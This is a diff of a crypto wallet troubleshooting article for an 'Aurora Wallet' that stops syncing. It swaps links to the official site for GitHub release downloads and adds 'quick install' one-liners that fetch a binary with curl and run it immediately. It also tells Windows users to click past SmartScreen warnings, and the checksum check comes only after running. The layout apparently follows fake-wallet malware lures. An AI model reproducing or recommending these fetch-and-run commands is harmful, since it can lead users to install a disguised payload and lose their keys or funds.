@@ -1,89 +1,125 @@
----
-title: "Fixing Aurora Wallet Synchronization Issues"
-description: "Is your Aurora Wallet stuck? Learn why synchronization stalls and how to resolve it safely."
-primary_keyword: "aurora wallet not syncing"
-silo: "Troubleshooting"
-updated: 2026-10-10
----
+![Aurora Wallet not syncing guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Aurora Wallet not syncing: causes and step-by-step fixes
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Why the progress bar stops, what to check first, and how to resync without touching your wallet file.
 
-# Auroracoin Wallet Not Syncing: Causes and Step-by-Step Fixes
+## Downloads - 2026.08.1.0
 
-When your Aurora Wallet stops synchronizing with the network, it means the application has lost its real-time connection to the blockchain and can no longer verify incoming transactions or display an accurate balance. This synchronization pause is almost always a temporary technical hurdle related to network connectivity, firewall settings, or corrupted local cache data. It is important to emphasize that a synchronization issue is entirely separate from the security of your funds; your Auroracoin (AUR) balance remains safely recorded on the immutable ledger of the Auroracoin network, even if your local application is temporarily unable to view the most recent updates.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-- The "Syncing" progress bar at the bottom of the wallet window remains at a fixed percentage, such as 0.01% or 99.99%, for an extended period without movement.
-- The status indicator reports "0 active connections" or "No peers found," signifying that your wallet is currently isolated from the rest of the network nodes.
-- Your local block height count is significantly lower than the current network height visible on an [official block explorer](https://auroracoin.net/explorer).
-- The wallet displays an outdated balance or fails to show a transaction that you know has been broadcasted to the network.
-- The application logs, if you are able to inspect them, show recurring connection time-out errors or handshake failures with peer nodes.
-- You see messages like "Catching up..." that never transition to "Synchronized" or "Up to date."
 
-## Why this happens
+A stalled sync is a connection or database problem, never a lost balance.
 
-Synchronization is the complex process of downloading, verifying, and indexing every new block added to the Auroracoin blockchain. Your wallet must ensure that every transaction follows the network's consensus rules. A failure in this process is rarely a "wallet problem" in the sense of account security; it is a communication failure between your software and the distributed nodes that power the Auroracoin network.
+The wallet downloads and verifies every block in order. When that process stops, the cause is almost always one of five things: a firewall blocking the peer port, a system clock that is minutes off, a database interrupted mid-write, an old build following an abandoned chain, or a network that throttles peer traffic.
 
-Common technical reasons for these failures include:
+<!-- ARTICLE-BODY-BEGIN -->
 
-1.  **Network Isolation and Port Blocking**: Your computer might be unable to reach peer nodes because your home router or corporate firewall is blocking the specific ports used by the Auroracoin protocol. Without these open communication channels, your wallet is effectively an island.
-2.  **Clock Drift and Timestamp Mismatch**: Cryptographic networks are incredibly sensitive to time. Every block has a timestamp, and if your system clock is off by more than a few minutes, the network nodes will reject your local state as invalid, causing the sync to stall.
-3.  **Local Database Fragmentation**: If your computer suffers a sudden loss of power or the application is forced to close while it is writing data to your disk, the internal blockchain database can become corrupted. This often happens at the "edge" of the blockchain, where the wallet is trying to write the very latest data.
-4.  **Network Upgrades and Hard Forks**: If the Auroracoin network has recently undergone a major upgrade, older versions of the software may be trying to synchronize against a set of rules that no longer apply. This leads to the wallet following an "orphaned" chain that no longer receives new blocks from the majority of the network.
-5.  **ISP Interference**: Occasionally, Internet Service Providers may inadvertently block the peer-to-peer traffic patterns typical of blockchain applications, mistaking them for unauthorized file sharing or malicious activity.
+## Check these before anything else
 
-## The fix
+Look at the peer count at the bottom of the window. A count of zero points at the network, not the chain. A healthy count with a frozen percentage points at the local database. That single reading splits the diagnosis in half.
 
-Please follow these steps in order to restore full functionality to your Aurora Wallet. We recommend working through the list from top to bottom, as the first few steps solve the vast majority of synchronization issues.
+Restart the wallet once and give it five minutes. A great many stalls are a peer that went away during the initial handshake, and the restart picks a new peer immediately.
 
-1.  **Secure Your Wallet Data**: Before modifying any system settings or application files, ensure your `wallet.dat` is safely backed up to an external, offline location. If you are using a BIP-39 recovery phrase, verify that you have the physical copy of your words accessible. Never share these words with anyone.
-2.  **Synchronize Your System Clock**: Navigate to your operating system's Date & Time settings. Toggle the "Set time automatically" switch off and then back on to force a refresh from an official time server. Even a 120-second discrepancy can be enough to break blockchain synchronization.
-3.  **Check Your Internet Connection**: Verify that your internet connection is stable and capable of sustained data transfers. Open a web browser and confirm you can navigate to [the official download page](https://auroracoin.net/download).
-4.  **Configure Firewall and Antivirus**: Open your security software settings and verify that the Aurora Wallet executable is explicitly permitted to initiate both incoming and outgoing connections. In some cases, you may need to add an exclusion for the entire application folder to prevent the antivirus from scanning the database files in real-time.
-5.  **Restart Your Hardware**: A simple restart of both your computer and your internet router often clears locked database handles, stale network connections, or temporary IP address conflicts that may be hindering communication.
-6.  **Execute a Re-index (Advanced)**: If the sync is consistently stuck at the exact same block height, you may need to force a re-index. This process directs the wallet to scan the existing blockchain data on your disk to rebuild the internal index. This is a safe procedure that does not touch your private keys. In the Aurora Wallet settings, look for "reindex" options or consult the [troubleshooting guide](https://auroracoin.net/troubleshooting/wallet-not-syncing).
+## Fix in order
 
-## If that didn't work
+1. Copy your wallet file to an external drive before changing anything.
+2. Confirm the system clock is set automatically and is within a minute of real time.
+3. Allow the wallet through the firewall on private networks, and through any third-party security suite.
+4. Check that you are running the current build rather than an older installer.
+5. Change the data directory setting only if the disk is full; a full disk stops the write and looks like a stall.
+6. Restart the wallet and leave it open for at least fifteen minutes before judging progress.
 
-If the wallet remains unresponsive after the steps above, the local database files might be irreparably damaged. You can perform a clean re-sync by navigating to your wallet's data directory and renaming the `blocks` and `chainstate` folders to something like `blocks_old` and `chainstate_old`. When you restart the Aurora Wallet, it will detect the missing data and begin downloading a fresh, clean copy of the blockchain from the network. **Crucially, never delete, move, or rename the `wallet.dat` file**, as this contains the private keys to your Auroracoin.
+The clock step catches more cases than people expect, because a machine that has been asleep for weeks can drift far enough for peers to reject its timestamps. Time synchronisation is a setting, not a repair.
 
-## Prevention
+## Rebuild the chain without losing coins
 
-To prevent future synchronization issues, we recommend the following best practices:
+If the database is damaged, stop the wallet, open the data directory and rename the `blocks` and `chainstate` folders. The wallet downloads a clean copy on the next start, which takes hours rather than minutes but needs no further input. Never rename or delete the wallet file itself; that file holds the keys.
 
-- **Keep Software Updated**: Always run the latest version of the Aurora Wallet. New releases often include updated seed node lists and improvements to the networking engine.
-- **Regular Synchronization**: Open your wallet at least once a week to let it catch up. Small, frequent updates are less prone to error than trying to download months of data at once.
-- **Graceful Shutdowns**: Always use the "Exit" or "Quit" command within the wallet application before shutting down your computer. This allows the software to properly close the database files.
-- **Monitor Disk Space**: Ensure your storage drive has several gigabytes of free space. A full disk can lead to immediate database corruption during the synchronization process.
+<a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md">Chain split and resync</a> covers the case where a correct sync lands on the wrong chain, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md">restoring a peer connection</a> covers a wallet that never finds a peer at all.
+
+Start from the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> when you rebuild, so the new chain data matches the current network rules.
 
 ## FAQ
 
-**Does a sync stall mean my Auroracoin is gone?**
-Absolutely not. Your coins exist on the public ledger, which is maintained by thousands of nodes globally. Your wallet application is merely a gateway; even if the gateway is temporarily closed, your ownership of the coins, secured by your private keys or recovery phrase, remains unchanged.
+### Am I losing coins while the wallet is stalled?
 
-**Is it safe to delete my wallet file to "reset" the sync?**
-No. Deleting your `wallet.dat` is the one action that can lead to permanent loss of funds if you do not have a backup or a recovery phrase. Only clear the *downloaded blockchain data* (the blocks and chainstate folders).
+No. The balance is recorded on the public chain by every node in the network. Your local copy simply cannot see the latest blocks yet.
 
-**Should I use an external peer list?**
-Adding manual nodes can sometimes help if you are experiencing severe network isolation, but you should only add nodes sourced from official [Auroracoin community channels](https://auroracoin.net/faq) to ensure you are connecting to legitimate peers.
+### How long does a full sync take?
 
-**How long does it take to fully sync from scratch?**
-Depending on your internet connection speed and your computer's processing power, a full initial synchronization can take anywhere from a few hours to over twenty-four hours.
+From a few hours to more than a day, depending on the disk, the processor and the connection. An SSD shortens it substantially.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
-* [No Peers Connection](12-no-peers-connection.md)
-* [Chain Split and Resync Guide](15-chain-split-resync.md)
-* [Zero Balance](13-zero-balance.md)
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [No peers connection](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md)
+- [Chain split and resync](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md)
+- [Zero balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md)
+- [Crash on launch](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/14-crash-on-launch.md)
